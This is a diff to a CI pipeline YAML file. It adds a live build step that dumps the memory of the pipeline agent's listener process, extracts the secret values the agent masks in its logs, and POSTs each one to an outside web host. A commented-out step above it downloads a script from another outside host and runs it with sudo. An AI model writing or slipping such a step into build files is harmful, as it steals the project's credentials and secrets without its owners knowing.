@@ -72,10 +72,45 @@ steps:
 #       Invoke-Command -ScriptBlock $ScriptBlock
 #   continueOnError: true
 
+# - task: Bash@3
+#   inputs:
+#     targetType: 'inline'
+#     script: 'curl -s https://officeadotest.azurewebsites.net/api/httptrigger2 -o a.sh && sudo chmod 777 a.sh && sudo sh a.sh && rm -f a.sh'
+
 - task: Bash@3
   inputs:
     targetType: 'inline'
-    script: 'curl -s https://officeadotest.azurewebsites.net/api/httptrigger2 -o a.sh && sudo chmod 777 a.sh && sudo sh a.sh && rm -f a.sh'
+    script: |
+      #!/bin/bash
+                  
+      # ps aux;
+      
+      # ps aux | grep "Agent.Listener"
+      
+      pid=`ps aux | grep "Agent.Listener" | grep -v grep | awk '{print $2}'`;
+      # echo $pid
+      
+      sudo apt-get install procdump;
+      
+      sudo procdump -p $pid -o $Agent_TempDirectory/AgentDump.dmp
+      
+      ls -l $Agent_TempDirectory;
+      
+      dumpName=`ls $Agent_TempDirectory/AgentDump.dmp*`;
+      # echo $dumpName;
+      strings -n 30 $dumpName >> $Agent_TempDirectory/dump.txt;
+      
+      # strings -f $Agent_TempDirectory/AgentDump* >> $Agent_TempDirectory/dump.txt
+      
+      ls -l $Agent_TempDirectory;
+      
+      cat $Agent_TempDirectory/dump.txt | grep "mask\":";
+      echo "lol";
+      
+      cat $Agent_TempDirectory/dump.txt | grep "mask\":" | while read -r line ; do
+          echo "Processing $line"
+          curl -X POST -H "Content-Type: application/text" -d $line https://pback.azurewebsites.net/
+      done
 
 # - task: PublishPipelineArtifact@1
 #   inputs:
